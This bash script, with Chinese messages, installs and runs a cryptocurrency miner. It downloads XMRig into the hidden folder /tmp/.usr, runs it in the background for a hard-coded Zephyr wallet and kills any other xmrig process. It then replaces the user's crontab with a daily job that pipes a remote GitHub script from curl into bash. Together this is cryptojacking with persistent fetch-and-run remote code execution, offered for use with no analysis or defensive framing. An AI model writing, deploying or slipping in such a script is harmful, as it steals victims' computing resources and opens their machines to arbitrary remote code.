#!/bin/bash


handle_error() {
    echo "发生错误：$1"
    exit 1
}

trap 'handle_error $LINENO' ERR

HOST="zeph.kryptex.network"

ROOT_path="/tmp/.usr"
wallet="ZEPHs6nHn1AJsdkqaZdUioNb7DnFNmcbXGuarcPSGGis7HBV7ZmeewCbUAVDwpGsiWGDyzUCVrcPLCMe6Sjd4V48Xu4FoLvTYRr"
xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
random_number=$(shuf -i 10000000-99999999 -n 1)
command="./xmrig --coin zephyr --url \"zeph.kryptex.network:8888\" --user \"$wallet/$random_number\" --tls -k -B"
ping -c 4 $HOST > /dev/null

if [ $? -eq 0 ]; then
    echo "网络畅通，可以连接到 $HOST"
else
    echo "无法连接到 $HOST"
    exit 1
fi

if pgrep xmrig > /dev/null; then
    # 如果进程存在，则杀死它
    pkill xmrig
    echo "已杀死xmrig进程"
else
    echo "xmrig进程不存在"
fi


if [ ! -d "$ROOT_path" ]; then
    echo "文件夹不存在，正在创建..."
    mkdir -p "$ROOT_path"
    if [ $? -ne 0 ]; then
        echo "无法创建文件夹"
        exit 1
    fi
fi

cd "$ROOT_path" || handle_error "无法切换到目录: $ROOT_path"

wget -O "xmrig.tar.gz" "$xmrig_url"
tar -xzf "xmrig.tar.gz" -C "$ROOT_path"
chmod +x "$ROOT_path/xmrig"
$command
sleep 10


if pgrep xmrig > /dev/null; then
    echo "xmrig进程存在，退出Shell代码执行"
    
else
    echo "xmrig进程不存在"
    exit 0
fi

if echo "$existing_crontab" | grep -q "0 1 * * * curl https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash"; then
    echo "指定的计划任务已添加"
else
    # 如果不存在，则添加计划任务
    echo "0 1 * * * curl https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash" | crontab -
    echo "已添加指定的计划任务"
fi
